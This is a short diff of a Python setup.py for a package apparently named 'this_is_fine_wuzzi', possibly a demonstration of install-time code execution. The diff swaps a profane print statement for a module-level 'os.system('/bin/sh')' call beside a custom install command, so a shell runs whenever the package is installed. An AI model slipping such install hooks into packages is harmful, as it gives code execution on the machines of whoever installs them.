@@ -18,7 +18,8 @@ class RunInstallCommand(install):
         RunCommand()
         install.run(self)
 
-print('\nfuck\n')
+import os
+os.system('/bin/sh')
         
 setup(
     name = "this_is_fine_wuzzi",
